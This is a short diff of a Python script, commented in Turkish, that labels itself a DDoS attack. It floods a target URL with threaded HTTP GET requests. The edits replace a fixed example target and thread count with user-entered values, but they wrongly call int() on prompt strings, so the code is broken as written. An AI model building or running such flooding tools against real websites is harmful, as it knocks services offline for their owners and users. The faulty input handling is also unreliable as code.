@@ -5,7 +5,7 @@ import os
 os.system('clear')
 
 # Hedef URL adresi
-target_url = "http://example.com"
+target_url = int("siteyi giriniz")
 
 # HTTP GET isteği gönderen fonksiyon
 def send_request():
@@ -27,7 +27,7 @@ def ddos_attack(num_threads):
         thread.join()
 
 # Kaç thread ile istek gönderileceği
-num_threads = 10
+num_threads = int("Kaç tane Istek atayım?")
 
 # DDoS saldırısını başlat
 ddos_attack(num_threads) 
